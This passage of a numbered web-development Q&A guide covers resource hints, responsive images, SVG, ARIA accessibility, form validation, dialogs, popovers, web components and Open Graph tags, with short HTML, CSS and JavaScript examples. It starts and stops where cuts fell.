The browser won't render the page until it has loaded the CSS in `<head>`. Otherwise users would see unstyled content that then suddenly changes (a "flash of unstyled content").

CSS also blocks scripts that come after it, because a script might read styles. To keep pages fast:

- Keep CSS small and split by page or route.
- Inline the small critical CSS for the first screen.
- Use `media` on `<link>` for CSS that's only needed in some cases, like print.

### 157: What does `<link rel="preload">` do?

It tells the browser to download a resource early, with high priority, because the page will need it soon.

```html
<link
  rel="preload"
  href="/fonts/inter.woff2"
  as="font"
  type="font/woff2"
  crossorigin
/>
<link rel="preload" href="/hero.avif" as="image" />
```

It is useful for resources the browser finds late, like fonts referenced in CSS or a hero image set as a CSS background. The `as` attribute is required. It sets the priority and the right request headers. If you preload something and don't use it within a few seconds, Chrome warns in the console.

### 158: What is `<link rel="prefetch">`?

`prefetch` downloads a resource with low priority because it might be needed for a future navigation.

```html
<link rel="prefetch" href="/checkout.js" />
```

It goes into the HTTP cache, so if the user goes to the next page, it loads faster. Use `preload` for the current page and `prefetch` for the next one.

### 159: What do `preconnect` and `dns-prefetch` do?

They set up connections to other origins before you request anything from them.

```html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link rel="dns-prefetch" href="https://api.example.com" />
```

- `dns-prefetch` only does the DNS lookup.
- `preconnect` does DNS, the TCP connection and the TLS handshake.

This can save a few hundred milliseconds for important third-party origins. Only preconnect to a few origins (2-4), because unused connections waste resources.

### 160: What is `<link rel="modulepreload">`?

It is like `preload`, but for JavaScript modules. It downloads, parses and compiles the module ahead of time, and can also load its dependencies.

```html
<link rel="modulepreload" href="/js/app.js" />
```

Without it, the browser only finds out about imports after downloading and parsing each file, which creates a "waterfall" of requests. Build tools like Vite add these links for you.

### 161: What is the `fetchpriority` attribute?

`fetchpriority` gives the browser a hint about how important a resource is compared to others of the same type. Values are `high`, `low` and `auto`.

```html
<img src="hero.jpg" alt="..." fetchpriority="high" />
<img src="carousel-slide-3.jpg" alt="..." fetchpriority="low" />
<script src="non-critical.js" async fetchpriority="low"></script>
```

It is supported on `<img>`, `<link>`, `<script>` and `<iframe>`, and in `fetch()`. The most common use is `fetchpriority="high"` on the LCP image.

### 162: How does `loading="lazy"` work?

```html
<img src="photo.jpg" alt="..." loading="lazy" width="800" height="600" />
<iframe
  src="https://maps.example.com/embed"
  title="Map"
  loading="lazy"
></iframe>
```

The browser waits to load the image or iframe until the user scrolls near it. This saves bandwidth and speeds up the first load. It works in all modern browsers.

Don't lazy-load images that are visible in the first screen, especially the main hero image. That delays them and hurts LCP. Set `width` and `height` so lazy images don't cause layout shifts.

### 163: What does the `decoding` attribute on images do?

It hints how the browser should decode the image:

- `sync`: decode it right away, together with the other content.
- `async`: decode it off the main thread, so other content can show first.
- `auto`: let the browser choose (default).

```html
<img src="large.jpg" alt="..." decoding="async" />
```

In practice, browsers already do a good job here, so the effect is small. Most people use it for big images below the fold.

### 164: How do `srcset` and `sizes` work with `w` descriptors?

You list image files with their real widths, and tell the browser how wide the image will be shown:

```html
<img
  src="photo-800.jpg"
  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  alt="A forest in autumn"
  width="1600"
  height="1067"
/>
```

`sizes` says: on screens up to 600px the image is full width, otherwise it is half the viewport. The browser takes that size, multiplies it by the device pixel ratio and picks the smallest file that is big enough. Without `sizes`, the browser assumes `100vw`.

### 165: When do you use `x` descriptors in `srcset`?

When the image always has the same display size, for example a logo or avatar, and you only need sharper versions for high-density screens:

```html
<img
  src="avatar.png"
  srcset="avatar.png 1x, avatar@2x.png 2x, avatar@3x.png 3x"
  alt="Profile picture"
  width="64"
  height="64"
/>
```

The browser picks the file that matches the screen's pixel density. You can't mix `x` and `w` descriptors in the same `srcset`.

### 166: What is art direction with `<picture>`?

Art direction means showing a different crop or image depending on the screen, not just a bigger or smaller version of the same one.

```html
<picture>
  <source media="(max-width: 600px)" srcset="team-portrait.jpg" />
  <source media="(min-width: 601px)" srcset="team-wide.jpg" />
  <img
    src="team-wide.jpg"
    alt="Our team of 12 people in the office"
    width="1200"
    height="600"
  />
</picture>
```

On a phone the user gets a tall, closely cropped photo. On desktop they get the wide shot. With `media`, the browser must follow your choice, unlike `srcset` alone, where it decides.

### 167: How do you serve modern image formats with a fallback?

Use `<picture>` with `type` on each `<source>`:

```html
<picture>
  <source srcset="photo.avif" type="image/avif" />
  <source srcset="photo.webp" type="image/webp" />
  <img src="photo.jpg" alt="..." width="1200" height="800" />
</picture>
```

The browser takes the first format it supports. AVIF and WebP are usually much smaller than JPEG. Many CDNs can also do this on the server by looking at the `Accept` header, in which case a plain `<img>` is enough.

### 168: How do you prevent layout shift from images and embeds?

- Set `width` and `height` attributes on `<img>`, `<video>` and `<iframe>`. Browsers turn them into an aspect ratio.
- For responsive embeds, use CSS `aspect-ratio`.
- Reserve space for ads and late-loading content with a fixed `min-height`.
- Don't insert content above what the user is reading, unless it is a response to their action.

```html
<img
  src="photo.jpg"
  alt="..."
  width="1200"
  height="800"
  style="max-width:100%;height:auto"
/>
```

### 169: What makes good `alt` text?

Describe what the image means in its context, not just what it shows.

- Be short and specific: `alt="Bar chart: revenue grew 40% from 2024 to 2026"`.
- Don't start with "Image of" or "Picture of". Screen readers already say it is an image.
- For a linked image, describe where the link goes: `alt="Home"` for a logo link.
- For images with text, include the text.
- For complex images like charts, give a short `alt` and a longer description in the page or a `<figcaption>`.

The same photo might need different `alt` text on different pages.

### 170: Should decorative images be `<img alt="">` or CSS backgrounds?

Both work. Use a CSS background when the image is purely visual and part of the design, like a pattern or a hero background. Use `<img alt="">` when the image is part of the content flow but adds no information, or when you want features like `srcset`, `loading="lazy"` or `fetchpriority`.

One downside of CSS backgrounds: the preload scanner can't see them, so they start loading later.

### 171: What are the ways to include SVG and their trade-offs?

| Method                         | Style with page CSS                           | Cached            | Notes                                   |
| ------------------------------ | --------------------------------------------- | ----------------- | --------------------------------------- |
| Inline `<svg>`                 | Yes                                           | No (part of HTML) | Can use `currentColor`, animate, script |
| `<img src="x.svg">`            | No                                            | Yes               | Scripts inside don't run, safest        |
| CSS `background-image`         | No                                            | Yes               | Decorative only                         |
| `<use href="sprite.svg#icon">` | Partly (via `currentColor` and CSS variables) | Yes               | Good for icon systems                   |
| `<object>` / `<iframe>`        | No                                            | Yes               | Rarely needed                           |

For icons, inline SVG or an SVG sprite with `<use>` is common. For illustrations, `<img>` is usually best.

### 172: How do you make SVG icons accessible?

If the icon is decorative or next to visible text, hide it:

```html
<button>
  <svg aria-hidden="true" focusable="false">...</svg>
  Delete
</button>
```

If the icon is the only content, give the button a name:

```html
<button aria-label="Delete">
  <svg aria-hidden="true">...</svg>
</button>
```

For a meaningful standalone SVG image, use `role="img"` and a label:

```html
<svg role="img" aria-labelledby="t1">
  <title id="t1">Company logo</title>
  ...
</svg>
```

### 173: When should you use `<canvas>` vs SVG?

- **SVG** is vector and lives in the DOM. Each shape is an element you can style, animate, click and make accessible. It works best for icons, logos, diagrams and charts with a moderate number of shapes.
- **Canvas** is a bitmap that you draw with JavaScript. There's no DOM per shape, so it handles thousands of moving objects better. It suits games, image processing, heavy data visualization and real-time drawing.

Canvas content is invisible to screen readers, so you need to add a text alternative or an accessible DOM version.

### 174: What is ARIA?

ARIA (Accessible Rich Internet Applications) is a set of attributes that add accessibility information to HTML: roles (`role="tab"`), states (`aria-expanded="true"`) and properties (`aria-label`).

ARIA only changes what assistive technology hears. It doesn't add any behavior. `role="button"` on a `<div>` doesn't make it focusable or clickable with the keyboard. You have to add that yourself.

### 175: What is the "first rule of ARIA"?

If there is a native HTML element that already does what you need, use it instead of adding ARIA to something else.

```html
<!-- Bad -->
<div role="button" tabindex="0" onclick="save()">Save</div>

<!-- Good -->
<button type="button" onclick="save()">Save</button>
```

The `<button>` is focusable, works with Enter and Space, has the right role and works in high-contrast mode, all for free. A common saying is "no ARIA is better than bad ARIA". Pages with ARIA often have more accessibility errors than pages without it, because it is easy to misuse.

### 176: What does the `role` attribute do?

`role` tells assistive technology what an element is, when the HTML element itself doesn't say it.

```html
<div role="alert">Your session will expire in 1 minute.</div>
<ul role="tablist">
  <li role="presentation">
    <button role="tab" aria-selected="true">Overview</button>
  </li>
</ul>
```

Most elements already have an implicit role: `<button>` is `button`, `<nav>` is `navigation`, `<a href>` is `link`. Don't repeat it (`<button role="button">` is redundant), and don't override it with a conflicting role.

### 177: What is the difference between `aria-label` and `aria-labelledby`?

Both give an element an accessible name.

- `aria-label` takes a string directly: `<button aria-label="Close">×</button>`.
- `aria-labelledby` points to the `id` of one or more elements whose text becomes the name.

```html
<h2 id="billing">Billing address</h2>
<section aria-labelledby="billing">...</section>
```

Prefer visible text and `aria-labelledby` where you can, since everyone sees the same label and it gets translated with the page. `aria-labelledby` wins if both are set. Neither works well on generic elements like a plain `<div>` or `<span>` without a role.

### 178: What does `aria-describedby` do?

It links an element to extra descriptive text, which screen readers read after the name and role.

```html
<label for="pwd">Password</label>
<input id="pwd" type="password" aria-describedby="pwd-hint" />
<p id="pwd-hint">At least 12 characters.</p>
```

The screen reader says something like "Password, edit text, At least 12 characters." It is commonly used for hints and error messages.

### 179: What does `aria-hidden="true"` do?

It removes the element and everything inside it from the accessibility tree. Screen readers ignore it, but it is still visible and still clickable.

Use it for decorative icons or duplicate content. Never put it on something focusable, like a button or link, or on a parent of one. Keyboard users can still Tab to it, but the screen reader says nothing, which is very confusing. To hide content from everyone, use `hidden` or `display: none`. To make a whole area unusable, use `inert`.

### 180: What are ARIA live regions?

A live region is an area that screen readers announce when its content changes, even if focus is somewhere else.

```html
<div aria-live="polite" id="status"></div>
<script>
  document.getElementById("status").textContent = "3 items added to cart";
</script>
```

- `aria-live="polite"`: announce when the user is idle.
- `aria-live="assertive"`: announce right away, interrupting. Use only for urgent messages.
- `role="status"` is polite and `role="alert"` is assertive.

The region must be in the DOM before you change its content, otherwise many screen readers won't announce it.

### 181: What do `aria-expanded` and `aria-controls` do?

`aria-expanded` tells users whether something a control opens is open or closed. `aria-controls` points to the element it controls.

```html
<button aria-expanded="false" aria-controls="menu" id="menu-btn">Menu</button>
<ul id="menu" hidden>
  ...
</ul>

<script>
  const btn = document.getElementById("menu-btn");
  btn.addEventListener("click", () => {
    const open = btn.getAttribute("aria-expanded") === "true";
    btn.setAttribute("aria-expanded", String(!open));
    document.getElementById("menu").hidden = open;
  });
</script>
```

The screen reader says "Menu, button, collapsed". Support for `aria-controls` varies between screen readers, but `aria-expanded` is widely used.

### 182: What is `aria-current`?

It marks the current item in a set, like the current page in navigation or the current step in a wizard.

```html
<nav aria-label="Main">
  <a href="/">Home</a>
  <a href="/blog" aria-current="page">Blog</a>
</nav>
```

Values include `page`, `step`, `location`, `date`, `time` and `true`. Screen readers say "current page", which a visual style alone can't tell them. You can also style it with `[aria-current="page"]` in CSS.

### 183: What are landmark roles and their HTML equivalents?

Landmarks are regions of the page that screen reader users can jump between.

| Landmark role   | HTML element                        |
| --------------- | ----------------------------------- |
| `banner`        | `<header>` (top-level only)         |
| `navigation`    | `<nav>`                             |
| `main`          | `<main>`                            |
| `complementary` | `<aside>`                           |
| `contentinfo`   | `<footer>` (top-level only)         |
| `region`        | `<section>` with an accessible name |
| `form`          | `<form>` with an accessible name    |
| `search`        | `<search>`                          |

Use the HTML elements and you don't need the roles. All page content should ideally be inside a landmark.

### 184: What is a skip link?

A skip link is a link at the very top of the page that jumps to the main content, so keyboard users don't have to Tab through the whole header and menu on every page.

```html
<body>
  <a class="skip-link" href="#main">Skip to main content</a>
  <header>...</header>
  <main id="main" tabindex="-1">...</main>
</body>
```

```css
.skip-link {
  position: absolute;
  left: -9999px;
}
.skip-link:focus {
  left: 1rem;
  top: 1rem;
}
```

It is usually hidden until it gets focus. The `tabindex="-1"` on `<main>` makes sure focus really moves there in all browsers.

### 185: Why does heading structure matter for screen reader users?

Many screen reader users navigate by headings. They pull up a list of all headings or press `H` to jump from one to the next, like scanning a page visually.

If headings are missing, they have to listen to everything. If levels are wrong (styled `<div>` instead of `<h2>`, or `<h4>` used because it's smaller), the structure doesn't make sense. Good headings work like a table of contents for the page.

### 186: What is an accessible name and how is it calculated?

The accessible name is what screen readers announce for an element, for example "Submit, button". Browsers calculate it in this order, roughly:

1. `aria-labelledby`
2. `aria-label`
3. Native labeling: `<label>` for inputs, `alt` for images, `<caption>` for tables, `<legend>` for fieldsets
4. The text content (for buttons, links, headings)
5. `title` as a last resort

You can check it in the Accessibility panel of browser DevTools.

### 187: Why use `<button>` instead of `<div onclick>`?

A `<div>` with a click handler is missing a lot:

- It can't be reached with Tab.
- It doesn't react to Enter or Space.
- Screen readers don't say it's a button.
- It doesn't work with forms (submit, disabled).
- It doesn't show in high-contrast modes as a button.

You can fix all of that with `role="button"`, `tabindex="0"`, key handlers and more, but `<button>` gives it all for free and you can style it however you want with CSS.

### 188: When should you use a link vs a button?

- **Link (`<a href>`)**: goes somewhere. It changes the URL, can be opened in a new tab, bookmarked and copied.
- **Button (`<button>`)**: does something on the current page. Submits a form, opens a dialog, toggles a menu, deletes an item.

Don't use `<a href="#" onclick="...">` for actions and don't use buttons with `location.href` for navigation. Screen reader users expect links and buttons to behave differently. For example, links react to Enter only, buttons to Enter and Space.

### 189: What is the difference between `tabindex="0"`, `tabindex="-1"` and a positive `tabindex`?

- `0`: adds a non-focusable element (like a `<div>`) to the Tab order at its natural DOM position. Use it for custom widgets.
- `-1`: makes the element focusable only with JavaScript or a link. Useful for moving focus to a heading, an error summary or a dialog.
- Positive (`1`, `2`, ...): elements with these come before everything else, in number order.

```html
<h2 id="errors" tabindex="-1">There are 2 errors in the form</h2>
<script>
  document.getElementById("errors").focus();
</script>
```

### 190: Why should you avoid positive `tabindex` values?

Positive values pull elements out of the normal order. All elements with positive values are focused first, then the rest of the page follows the DOM order. This almost always ends up confusing: focus jumps around the page and doesn't match what the user sees.

It is also hard to maintain, because adding a new element means updating numbers everywhere. Fix the DOM order instead, so it matches the visual order.

### 191: How do you make a custom interactive widget keyboard accessible?

1. Use a native element if possible.
2. If not, make it focusable with `tabindex="0"`.
3. Give it the right `role` and accessible name.
4. Handle the expected keys: Enter and Space for buttons, arrow keys for tabs, menus and listboxes, Esc for closing.
5. Update ARIA states like `aria-expanded`, `aria-selected`, `aria-checked`.
6. Show a visible focus style.

The WAI-ARIA Authoring Practices Guide (APG) describes the expected keyboard behavior for common widgets like tabs, menus and comboboxes.

### 192: How do you make data tables accessible?

- Use `<th>` for header cells.
- Add `scope="col"` or `scope="row"` to say what the header covers.
- Add a `<caption>` describing the table.
- For complex tables with multi-level headers, use `id` on headers and `headers` on cells.

```html
<table>
  <caption>
    Exam results
  </caption>
  <thead>
    <tr>
      <th scope="col">Student</th>
      <th scope="col">Score</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Ana</th>
      <td>92</td>
    </tr>
  </tbody>
</table>
```

When the user moves to "92", the screen reader can say "Ana, Score, 92".

### 193: How do you show form errors in an accessible way?

- Put the error message next to the field and link it with `aria-describedby`.
- Mark the field with `aria-invalid="true"`.
- Don't use only color. Add text and maybe an icon.
- On submit, move focus to the first invalid field or to an error summary at the top.

```html
<label for="email">Email</label>
<input
  id="email"
  name="email"
  type="email"
  aria-invalid="true"
  aria-describedby="email-error"
/>
<p id="email-error">Enter an email address like name@example.com</p>
```

Write clear messages that say how to fix the problem, not just "Invalid input".

### 194: How do you group related form controls for accessibility?

Use `<fieldset>` and `<legend>`, especially for radio buttons and checkboxes:

```html
<fieldset>
  <legend>Preferred contact method</legend>
  <label><input type="radio" name="contact" value="email" /> Email</label>
  <label><input type="radio" name="contact" value="phone" /> Phone</label>
</fieldset>
```

Without the legend, a screen reader would only say "Email, radio button", and the user wouldn't know what the question is. If a fieldset doesn't fit your design, you can use `role="group"` with `aria-labelledby` on a `<div>`.

### 195: What is the Constraint Validation API?

It is the JavaScript API behind built-in form validation. The main methods:

- `checkValidity()`: returns `true` or `false` and fires an `invalid` event on invalid fields.
- `reportValidity()`: same, but also shows the browser's error message to the user.
- `setCustomValidity(message)`: sets a custom error. An empty string clears it.

```js
const confirm = document.getElementById("confirm");
confirm.addEventListener("input", () => {
  const pwd = document.getElementById("pwd").value;
  confirm.setCustomValidity(
    confirm.value === pwd ? "" : "Passwords do not match",
  );
});
```

A field with a custom error message is invalid until you clear it with `''`.

### 196: What is `ValidityState`?

Every form field has a `validity` property with booleans that explain why it is invalid:

- `valueMissing`: required but empty
- `typeMismatch`: not a valid email/URL
- `patternMismatch`: doesn't match `pattern`
- `tooShort`, `tooLong`
- `rangeUnderflow`, `rangeOverflow`, `stepMismatch`
- `badInput`: the browser can't convert the input (like letters in a number field)
- `customError`: set with `setCustomValidity`
- `valid`: true if none of the above

```js
if (input.validity.valueMissing) {
  showError("This field is required");
}
```

You can use it to show your own error messages instead of the browser's default ones.

### 197: What do `novalidate` and `formnovalidate` do?

- `novalidate` on `<form>` turns off the browser's validation on submit. The validation attributes still work for `:invalid` CSS and the JavaScript API.
- `formnovalidate` on a submit button skips validation only when that button is used.

```html
<form novalidate>...</form>

<form>
  <input name="title" required />
  <button type="submit">Publish</button>
  <button type="submit" formnovalidate name="action" value="draft">
    Save draft
  </button>
</form>
```

Many apps use `novalidate` so they can show their own error UI while still using the validation API.

### 198: What is the difference between `:invalid` and `:user-invalid`?

`:invalid` matches any field that fails validation, right away. So a required field is red as soon as the page loads, before the user has typed anything.

`:user-invalid` only matches after the user has interacted with the field (changed it and moved away, or tried to submit). That gives a much better experience.

```css
input:user-invalid {
  border-color: crimson;
}
```

`:user-invalid` and `:user-valid` are supported in all modern browsers.

### 199: How do input types like `email`, `tel` and `url` help on mobile?

They change the on-screen keyboard:

- `type="email"`: shows `@` and `.` keys.
- `type="tel"`: shows a phone keypad.
- `type="url"`: shows `/` and `.com` keys.
- `type="number"`: shows a number keyboard.

`email` and `url` also add basic format validation. `tel` doesn't validate at all, because phone formats differ around the world.

### 200: What is the `inputmode` attribute?

`inputmode` controls which virtual keyboard appears, without changing the input type or its validation.

```html
<input
  type="text"
  inputmode="numeric"
  pattern="[0-9]*"
  autocomplete="one-time-code"
  name="code"
/>
```

Values: `none`, `text`, `decimal`, `numeric`, `tel`, `search`, `email`, `url`. It's useful when `type="number"` is wrong for the data, like credit card numbers, PIN codes or ZIP codes. Those aren't really numbers, since leading zeros matter and you don't want spinner arrows.

### 201: What is the `enterkeyhint` attribute?

It changes the label or icon of the Enter key on mobile keyboards:

```html
<input type="search" name="q" enterkeyhint="search" />
<input name="message" enterkeyhint="send" />
```

Values: `enter`, `done`, `go`, `next`, `previous`, `search`, `send`. It only changes the label. You still need to handle what happens when the key is pressed.

### 202: Which `autocomplete` values should you know?

Some of the most useful ones:

- `name`, `given-name`, `family-name`
- `email`, `tel`
- `street-address`, `postal-code`, `country`, `address-level2` (city)
- `cc-name`, `cc-number`, `cc-exp`, `cc-csc`
- `username`, `current-password`, `new-password`
- `one-time-code`: for SMS and email codes
- `bday`, `organization`

```html
<input name="newPassword" type="password" autocomplete="new-password" />
```

`new-password` tells password managers to suggest a strong password, and `current-password` tells them to fill the saved one. Correct values also help meet the WCAG "Identify Input Purpose" rule.

### 203: What does the `form` attribute on an input do?

It links a field to a `<form>` by its `id`, even if the field is somewhere else in the DOM.

```html
<form id="search-form" action="/search">
  <input name="q" />
</form>

<button type="submit" form="search-form">Search</button>
```

This is useful when the layout puts a button or field outside the form, like a submit button in a sticky footer or fields inside table rows.

### 204: What are `formaction`, `formmethod` and similar button attributes?

They let a submit button override the form's settings:

- `formaction`: a different URL
- `formmethod`: a different method
- `formenctype`: a different encoding
- `formtarget`: a different target
- `formnovalidate`: skip validation

```html
<form action="/posts" method="post">
  <input name="title" />
  <button type="submit">Publish</button>
  <button type="submit" formaction="/posts/preview" formtarget="_blank">
    Preview
  </button>
</form>
```

So one form can have several buttons that do different things.

### 205: How do you get form data in JavaScript?

Use `FormData`:

```js
const form = document.querySelector("form");

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  const data = new FormData(form, event.submitter);

  console.log(data.get("email"));
  console.log(data.getAll("tags"));

  await fetch("/api/signup", { method: "POST", body: data });
});
```

`FormData` follows the same rules as a normal submit: only named, enabled fields, only checked checkboxes and radios. Passing `event.submitter` as the second argument includes the name and value of the button that was clicked. To send JSON, use `Object.fromEntries(data)` (careful, it keeps only one value per key).

### 206: What is the difference between `form.submit()` and `form.requestSubmit()`?

- `form.submit()` sends the form right away. It skips validation and does **not** fire the `submit` event, so your submit handlers don't run.
- `form.requestSubmit()` acts like the user clicked a submit button: it runs validation, fires the `submit` event and then submits if nothing cancels it.

```js
form.requestSubmit();
form.requestSubmit(document.querySelector("#save-draft")); // as if this button was clicked
```

In most cases you want `requestSubmit()`.

### 207: How do you handle a form submit with JavaScript?

Listen to the `submit` event on the form, not the `click` event on the button:

```js
form.addEventListener("submit", (event) => {
  event.preventDefault();
  // validate, send with fetch, show a message...
});
```

The `submit` event fires for every way of submitting: clicking the button, pressing Enter in a field, or `requestSubmit()`. A `click` handler on the button misses the Enter key. `event.submitter` tells you which button was used.

### 208: What is sent for an unchecked checkbox?

Nothing. Unchecked checkboxes are left out of the form data completely. So on the server, "missing" means "unchecked".

If you need an explicit value, a common trick is a hidden field with the same name before the checkbox:

```html
<input type="hidden" name="newsletter" value="no" />
<input type="checkbox" name="newsletter" value="yes" />
```

When checked, both values are sent and many server frameworks take the last one. Check how your back end handles repeated keys before using this.

### 209: Are disabled and readonly fields sent with the form?

- `disabled` fields are **not** sent.
- `readonly` fields **are** sent.

This often causes bugs: a developer disables a field to stop the user from editing it, and then the server doesn't receive the value. If you need the value, use `readonly` or add a hidden input. Fields inside a disabled `<fieldset>` are also not sent.

### 210: What format do date and time inputs use for their values?

The display format depends on the user's language and region, but the `value` always uses a fixed format:

- `date`: `2026-10-24`
- `time`: `14:30` (or `14:30:15`)
- `datetime-local`: `2026-10-24T14:30`
- `month`: `2026-10`
- `week`: `2026-W43`

```js
const input = document.querySelector('input[type="date"]');
console.log(input.value); // "2026-10-24"
console.log(input.valueAsDate); // Date object (UTC midnight)
```

`datetime-local` has no time zone, so you must decide on the server which zone it means.

### 211: What are `type="range"` and `type="color"`?

- `range`: a slider for picking a number where the exact value isn't important, like volume.
- `color`: opens a color picker and the value is a hex color like `#ff6600`.

```html
<label for="vol">Volume</label>
<input id="vol" type="range" min="0" max="100" value="50" />

<label for="theme">Theme color</label>
<input id="theme" type="color" value="#3366ff" />
```

A range slider doesn't show its value by default. Pair it with an `<output>` if the number matters.

### 212: What are the limits of wrapping an input in a `<label>`?

Implicit labels (input inside the label) are simple, but:

- Some older assistive tech and voice control software handled them less reliably than `for`/`id`.
- The label wraps the whole field, which can make layout harder.
- You can't put more than one form control inside one label; only the first labelable element is linked.
- Putting other interactive elements inside the label (like a link to the terms) can cause confusing click behavior.

Using `for` and `id`, or both together, is the most reliable choice.

### 213: What is the difference between `dialog.show()` and `dialog.showModal()`?

- `show()` opens a non-modal dialog. The rest of the page stays interactive. It is placed in the normal page flow.
- `showModal()` opens a modal dialog. It goes into the top layer above everything, gets a `::backdrop`, makes the rest of the page inert, moves focus into it and closes with Esc.

```js
const dialog = document.querySelector("dialog");
dialog.showModal();
dialog.close("done"); // closes and sets returnValue to "done"
```

Don't use the `open` attribute to show a dialog. It opens it non-modally and skips focus handling.

### 214: How does `<form method="dialog">` work?

A form inside a `<dialog>` with `method="dialog"` doesn't send anything to a server. Submitting it closes the dialog and sets `dialog.returnValue` to the `value` of the button used.

```html
<dialog id="confirm">
  <form method="dialog">
    <p>Discard changes?</p>
    <button value="cancel">Cancel</button>
    <button value="discard">Discard</button>
  </form>
</dialog>

<script>
  const dialog = document.getElementById("confirm");
  dialog.addEventListener("close", () => {
    if (dialog.returnValue === "discard") discardChanges();
  });
</script>
```

You can also use `formmethod="dialog"` on a single button.

### 215: What are the `::backdrop` pseudo-element and the `cancel` event on dialogs?

`::backdrop` is a box behind a modal dialog that covers the page. You style it to dim the background:

```css
dialog::backdrop {
  background: rgb(0 0 0 / 0.5);
}
```

The `cancel` event fires when the user tries to close a modal with Esc. You can call `preventDefault()` on it to stop that, for example when there are unsaved changes. After a successful close, the `close` event fires.

### 216: What is the Popover API?

It lets you show and hide popups like menus, tooltips and toasts with only HTML:

```html
<button popovertarget="menu">Open menu</button>
<div id="menu" popover>
  <a href="/profile">Profile</a>
  <a href="/logout">Log out</a>
</div>
```

The browser takes care of a lot for you:

- The popover goes into the top layer, so no `z-index` problems.
- Clicking outside or pressing Esc closes it ("light dismiss").
- Only one auto popover is open at a time (unless nested).
- Accessibility links between the button and the popover, like `aria-expanded`.

It is supported in all modern browsers since 2024.

### 217: What is the difference between `popover="auto"` and `popover="manual"`?

- `auto` (the default for `popover` with no value): light dismiss is on. Clicking outside or pressing Esc closes it, and opening another auto popover closes it unless one is nested inside the other.
- `manual`: no light dismiss. It stays open until you close it with a button or JavaScript, and several can be open at once. Good for toasts.

```html
<div id="toast" popover="manual">Saved!</div>
<script>
  const toast = document.getElementById("toast");
  toast.showPopover();
  setTimeout(() => toast.hidePopover(), 3000);
</script>
```

### 218: What do `popovertarget` and `popovertargetaction` do?

`popovertarget` on a `<button>` points to the `id` of a popover. `popovertargetaction` sets what the button does:

- `toggle` (default): open if closed, close if open
- `show`: only open
- `hide`: only close

```html
<button popovertarget="help" popovertargetaction="show">Help</button>
<div id="help" popover>
  <p>Some help text.</p>
  <button popovertarget="help" popovertargetaction="hide">Close</button>
</div>
```

These attributes only work on buttons (`<button>` and `<input type="button">`).

### 219: When should you use a popover vs a `<dialog>`?

- Use a **modal `<dialog>`** when the user must deal with it before going back to the page: confirmations, forms, important messages. The page behind becomes inert.
- Use a **popover** for non-modal UI that sits on top but doesn't block the page: menus, tooltips, pickers, toasts, teaching tips.

You can also combine them: `<dialog popover>` gives a non-modal dialog with light dismiss.

### 220: How do you build an exclusive accordion with `<details>`?

Give several `<details>` elements the same `name`. Opening one closes the others, like radio buttons.

```html
<details name="faq" open>
  <summary>How long is shipping?</summary>
  <p>3-5 business days.</p>
</details>
<details name="faq">
  <summary>Can I return items?</summary>
  <p>Yes, within 30 days.</p>
</details>
```

This needs no JavaScript and is supported in all modern browsers. Be careful: hiding content can make it harder to find, so only use an exclusive accordion when it really helps.

### 221: What is `hidden="until-found"`?

It hides content like `hidden`, but the browser's find-in-page (Ctrl+F) and links to fragments can still find it. When there is a match, the browser removes the attribute, shows the content and fires a `beforematch` event.

```html
<div hidden="until-found" id="answer">The full answer text...</div>
<script>
  document.getElementById("answer").addEventListener("beforematch", () => {
    // update your accordion state here
  });
</script>
```

It is useful for custom accordions and tabs, so hidden text can still be searched. It is supported in Chromium-based browsers and Firefox; check current Safari support before relying on it. Closed `<details>` elements get similar behavior automatically in supporting browsers.

### 222: What is the `inert` attribute?

`inert` makes an element and everything inside it non-interactive:

- It can't be clicked or focused.
- It is hidden from screen readers.
- Its text can't be selected.
- Find-in-page skips it.

```html
<main inert>...</main>
<div class="side-panel">...</div>
```

It's useful when you build your own modal or drawer and want the rest of the page to be unreachable. A modal `<dialog>` already does this for you. Pair `inert` with visual styling so users can tell the area is inactive.

### 223: How do you use the `<template>` element with JavaScript?

The content of a `<template>` lives in a `DocumentFragment` at `template.content`. You clone it, fill it in and insert it:

```html
<template id="product-card">
  <article class="card">
    <h3></h3>
    <p class="price"></p>
  </article>
</template>

<script>
  const tpl = document.getElementById("product-card");
  for (const p of [
    { name: "Mug", price: "$8" },
    { name: "Pen", price: "$2" },
  ]) {
    const card = tpl.content.cloneNode(true);
    card.querySelector("h3").textContent = p.name;
    card.querySelector(".price").textContent = p.price;
    document.querySelector("#products").append(card);
  }
</script>
```

Using `textContent` for the data keeps it safe from HTML injection.

### 224: What are web components?

Web components are a set of browser features for building reusable custom elements:

- **Custom elements**: define your own tags like `<user-card>` with a JavaScript class.
- **Shadow DOM**: an isolated DOM tree with its own scoped styles.
- **HTML templates**: `<template>` and `<slot>` for markup.

```js
class HelloUser extends HTMLElement {
  connectedCallback() {
    this.textContent = `Hello, ${this.getAttribute("name")}`;
  }
}
customElements.define("hello-user", HelloUser);
```

```html
<hello-user name="Nino"></hello-user>
```

They work in any framework or with no framework.

### 225: What are the naming rules for custom elements?

The name must:

- Contain a hyphen (`my-button`, `user-card`). This avoids clashes with current and future built-in elements.
- Start with a lowercase ASCII letter.
- Not use uppercase letters.
- Not be one of a few reserved names like `font-face` or `annotation-xml`.

Custom elements always need a closing tag. `<user-card />` doesn't close it in HTML.

### 226: What problems come with `contenteditable`?

- Browsers produce different HTML when the user presses Enter, pastes or formats text.
- Pasted content can bring in messy markup or even unsafe HTML, so you must sanitize it.
- Undo/redo, selection and cursor handling are hard to get right.
- It isn't a form field, so you need extra work for forms and accessibility (`role="textbox"`, `aria-multiline`, a label).

That's why most apps use a library (like ProseMirror, Lexical or TipTap) for rich text. For simple editable text, `contenteditable="plaintext-only"` avoids the formatting problems.

### 227: How do `data-*` attributes map to `dataset` in JavaScript?

The `data-` prefix is removed and the rest is turned from kebab-case into camelCase:

```html
<div id="el" data-user-id="7" data-is-admin="true"></div>
```

```js
const el = document.getElementById("el");
el.dataset.userId; // "7"
el.dataset.isAdmin; // "true" (a string, not a boolean)
el.dataset.lastLogin = "2026-10-24"; // adds data-last-login
delete el.dataset.isAdmin; // removes the attribute
```

All values are strings, so convert them yourself. Don't store large data or anything secret in them.

### 228: What are Open Graph meta tags?

They control how a page looks when shared on social media and chat apps (Facebook, LinkedIn, Slack, WhatsApp and others):

```html
<meta property="og:title" content="10 Easy Pasta Recipes" />
<meta property="og:description" content="Quick dinners in under 20 minutes." />
<meta
  property="og:image"
  content="https://example.com/images/pasta-share.jpg"
